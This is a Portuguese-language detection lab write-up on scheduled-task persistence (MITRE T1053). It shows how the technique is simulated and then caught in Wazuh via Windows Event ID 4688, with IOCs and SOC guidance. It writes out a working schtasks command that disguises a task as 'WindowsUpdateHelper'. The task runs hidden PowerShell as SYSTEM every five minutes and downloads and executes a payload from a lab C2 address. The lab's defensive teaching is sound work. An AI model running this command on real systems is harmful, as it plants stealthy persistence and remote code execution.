# Lab 07 — Scheduled Task Creation Detection (T1053)

## MITRE ATT&CK
- **Tactic:** Persistence
- **Technique:** T1053 — Scheduled Task/Job
- **Detection:** Windows Security Event ID 4688 (Process Creation)

---

## Objetivo

Simular a criação de uma scheduled task maliciosa via linha de comando, técnica amplamente usada por atacantes para estabelecer persistência após comprometimento inicial, e detectar o comportamento através do Wazuh SIEM.

---

## Ambiente do Lab

| Máquina | Role | IP |
|---|---|---|
| Kali Linux | Attacker / C2 Server | 192.168.56.104 |
| Windows 10 | Target | 192.168.56.103 |
| Wazuh Server | SIEM | — |

---

## Explicação Técnica

Após comprometer uma máquina, atacantes frequentemente criam **scheduled tasks** para garantir que seu acesso seja mantido mesmo após reinicializações ou remoção de outros mecanismos. Essa técnica é classificada pelo MITRE ATT&CK como T1053 e é amplamente utilizada por grupos APT e ransomware.

Neste lab, o atacante:
1. Cria uma tarefa agendada disfarçada com nome legítimo (`WindowsUpdateHelper`)
2. A tarefa executa um PowerShell oculto com um download cradle embutido, apontando para o servidor do atacante
3. O Wazuh captura o Event ID 4688 com o `commandLine` completo do processo `schtasks.exe`, expondo toda a cadeia de persistência

Os indicadores críticos de detecção são:
- Processo `schtasks.exe` iniciado a partir do `powershell.exe`
- `commandLine` contendo `-ExecutionPolicy Bypass`, `-WindowStyle Hidden` e uma URL externa
- Task rodando como `SYSTEM` com intervalo de execução curto

---

## Passo a Passo do Ataque

### 1. Criar a Scheduled Task maliciosa

No Windows 10, com PowerShell aberto como Administrador:

```powershell
schtasks /create /tn "WindowsUpdateHelper" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command 'IEX(New-Object Net.WebClient).DownloadString(''http://192.168.56.104:8080/payload.txt'')'" /sc minute /mo 5 /ru SYSTEM
```

**Anatomia do comando:**

| Parâmetro | Valor | Significado |
|---|---|---|
| `/tn` | `WindowsUpdateHelper` | Nome disfarçado de processo legítimo |
| `/tr` | `powershell.exe ...` | PowerShell oculto com download cradle |
| `/sc minute /mo 5` | A cada 5 minutos | Persistência contínua |
| `/ru SYSTEM` | SYSTEM | Execução com privilégio máximo |

![Scheduled Task Created](images/01-schtasks-created.png)

---

### 2. Detecção no Wazuh — Event ID 4688

No Wazuh Dashboard, o evento foi localizado com o filtro:

```
data.win.eventdata.commandLine: *WindowsUpdateHelper*
```

O Wazuh retornou **1 hit** — o processo `schtasks.exe` sendo criado pelo agente `DESKTOP-8LF9GEI`, rule ID `67027`, às `Mar 20, 2026 @ 19:25:49`.

![Wazuh 4688 Detection](images/02-wazuh-4688-schtasks.png)

---

### 3. Análise dos campos do evento

Com o evento expandido no Wazuh, os campos confirmam toda a cadeia do ataque:

| Campo | Valor |
|---|---|
| `eventID` | `4688` |
| `newProcessName` | `C:\Windows\System32\schtasks.exe` |
| `parentProcessName` | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| `commandLine` | Comando completo com `-ExecutionPolicy Bypass`, `-WindowStyle Hidden` e URL do C2 |
| `subjectUserName` | `target` |
| `targetUserSid` | `S-1-0-0` |

![Wazuh Event Details](images/03-wazuh-event-details.png)

---

## Indicadores de Comprometimento (IOCs)

| Indicador | Valor |
|---|---|
| Processo | `schtasks.exe` |
| Processo pai | `powershell.exe` |
| Nome da task | `WindowsUpdateHelper` |
| Flag suspeita | `-ExecutionPolicy Bypass -WindowStyle Hidden` |
| Método | `IEX(New-Object Net.WebClient).DownloadString()` |
| C2 | `http://192.168.56.104:8080/payload.txt` |
| Privilégio | `SYSTEM` |
| Event ID | `4688` |

---

## O que o SOC deve observar

- `schtasks.exe` iniciado a partir de `powershell.exe` ou `cmd.exe`
- `commandLine` de scheduled task contendo `powershell`, `IEX`, `DownloadString`, `WebClient` ou URLs externas
- Tasks criadas com `/ru SYSTEM` por usuários não administrativos
- Nomes de tasks que imitam processos legítimos do Windows (`WindowsUpdate*`, `Microsoft*`, `System*`)
- Intervalo de execução muito curto (`/sc minute`) combinado com comandos de rede

---

## Cleanup

```powershell
schtasks /delete /tn "WindowsUpdateHelper" /f
```

---

## Estrutura de Arquivos

```
lab-07-t1053-scheduled-task/
├── README.md
└── images/
    ├── 01-schtasks-created.png
    ├── 02-wazuh-4688-schtasks.png
    └── 03-wazuh-event-details.png
```

---

## Referências

- [MITRE ATT&CK T1053 — Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/)
- [Windows Event ID 4688 — Process Creation](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)
- [Wazuh Documentation](https://documentation.wazuh.com)
